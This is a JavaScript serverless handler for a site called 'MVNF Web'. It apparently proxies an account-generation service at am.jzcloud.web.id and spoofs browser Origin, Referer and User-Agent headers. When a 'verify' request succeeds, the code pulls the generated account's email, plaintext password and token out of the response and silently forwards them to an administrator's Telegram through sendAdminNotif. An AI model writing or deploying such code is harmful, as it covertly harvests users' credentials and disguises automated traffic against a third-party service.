// ============================================================
// MVNF - api/am.js
// AM JZCloud - Dhanz + NOTIF TELE
// BASE langsung tancap, tanpa ENV
// ============================================================

import { sendAdminNotif } from "./_tele.js";

export default async function handler(req, res) {

  if (req.method !== 'POST') {
    return res.status(405).json({
      success: false,
      message: 'Method not allowed'
    });
  }

  const { action, email, magicLink } = req.body || {};

  // ---------- LANGSUNG TANCAP ----------
  const BASE = 'https://am.jzcloud.web.id';

  const HEADERS = {
    'Accept': 'application/json',
    'Origin': BASE,
    'Referer': `${BASE}/`,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
    'Content-Type': 'application/json'
  };

  try {
    let url = '';
    let options = {};

    if (action === 'stats') {
      url = `${BASE}/api/stats`;
      options = { method: 'GET', headers: HEADERS };

    } else if (action === 'send') {
      url = `${BASE}/api/send-link`;
      options = {
        method: 'POST',
        headers: HEADERS,
        body: JSON.stringify({ email })
      };

    } else if (action === 'verify') {
      url = `${BASE}/api/verify-link`;
      options = {
        method: 'POST',
        headers: HEADERS,
        body: JSON.stringify({ email, magicLink })
      };

    } else {
      return res.status(400).json({
        success: false,
        message: 'Action tidak dikenal'
      });
    }

    const r = await fetch(url, options);
    const text = await r.text();

    let data = null;
    try { data = JSON.parse(text); } catch {}

    // 🔥 NOTIF TELE - CUMA PAS VERIFY BERHASIL
    if (action === 'verify' && r.ok) {
      const jam = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
      const accEmail = data?.data?.email || data?.email || email || '-';
      const accPass = data?.data?.password || data?.password || data?.data?.pass || '-';
      const accToken = data?.data?.token || data?.token || '';
      const tokenPendek = accToken ? `\n🔑 Token: \`${String(accToken).slice(0, 30)}...\`` : '';
      await sendAdminNotif(`🔥 *ADA YANG GENERATE!*\n\n🎬 Service: *AM*\n📧 Email: \`${accEmail}\`\n🔑 Pass: \`${accPass}\`${tokenPendek}\n🕐 Jam: ${jam}\n------------------------\nMVNF Web`);
    }

    return res.status(200).json({
      success: r.ok,
      data: data || text,
      message: data?.message || data?.error || ''
    });

  } catch (e) {
    return res.status(500).json({
      success: false,
      message: e.message
    });
  }
}
